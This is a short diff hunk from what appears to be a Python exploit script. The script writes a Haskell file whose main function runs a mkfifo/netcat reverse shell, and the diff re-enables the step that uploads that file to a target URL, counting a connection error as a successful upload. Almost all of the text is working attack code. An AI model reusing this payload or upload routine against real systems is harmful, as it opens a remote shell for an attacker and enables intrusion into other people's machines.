@@ -12,8 +12,8 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 
 '''
 with open("re.hs" ,'w') as f:
     f.write(payload)
-#    with open("re.hs","rb") as f:
-#        try:
-#            test = r.post(URL,files ={"file":f})
-#        except r.exceptions.ConnectionError:
-#            print("Upload completed successfully!")
+    with open("re.hs","rb") as f:
+        try:
+            test = r.post(URL,files ={"file":f})
+        except r.exceptions.ConnectionError:
+            print("Upload completed successfully!")
